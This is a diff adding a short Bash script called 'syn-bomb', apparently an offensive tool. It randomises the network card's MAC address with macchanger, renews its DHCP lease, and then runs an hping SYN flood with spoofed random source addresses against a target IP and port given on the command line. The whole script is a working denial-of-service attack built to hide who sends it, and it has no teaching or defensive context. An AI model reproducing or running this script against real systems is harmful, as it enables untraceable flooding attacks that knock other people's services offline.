@@ -1,0 +1,44 @@
+#! /bin/bash
+
+#Check if Parameters are set
+if [ "$3" = "" ]; then
+	echo "Use: syn-bomb TARGET_IP PORT INTERFACE"
+	exit
+fi
+
+echo "Welcome to SYN Bomb!"
+echo ""
+echo "Target: $1:$2 with interface $3"
+echo ""
+
+#Set interface down
+echo "INFO: Down interface"
+sudo ifconfig $3 down
+
+#Show current MAC address
+sudo macchanger -s $3 |grep Current
+
+#Change MAC address
+echo "INFO: Changing MAC"
+sudo macchanger -rb $3
+
+#Show current MAC address
+sudo macchanger -s $3 |grep Current
+
+#Reup interface
+echo "INFO: Reup interface"
+sudo ifconfig $3 up
+
+#Kill dhcpcd just in case its running
+echo "INFO: Killing DHCPCD, just in case its running..."
+sudo killall dhcpcd &> /dev/null
+
+#Show MAC again to be really really sure its changed
+echo "INFO: Show MAC address again to be really sure its changed"
+sudo macchanger -s $3 |grep Current
+
+#Get new IP
+sudo dhcpcd $3
+
+#SYN attack
+sudo hping -i u5 -S -p $2 $1 --rand-source --flood -I $3
